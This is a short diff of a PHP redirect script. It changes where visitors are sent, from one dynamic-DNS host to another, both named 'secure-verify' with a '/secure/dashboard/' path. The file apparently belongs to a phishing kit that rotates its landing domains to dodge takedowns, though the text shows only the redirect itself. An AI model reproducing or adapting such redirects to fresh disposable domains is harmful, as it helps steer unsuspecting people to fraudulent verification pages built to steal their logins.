@@ -1,4 +1,4 @@
 <?php
-  header("Location: https://secure-verify043.ddns.net/secure/dashboard/");
+  header("Location: https://secure-verifyc117s.ddns.net/secure/dashboard/");
   die();
 ?>
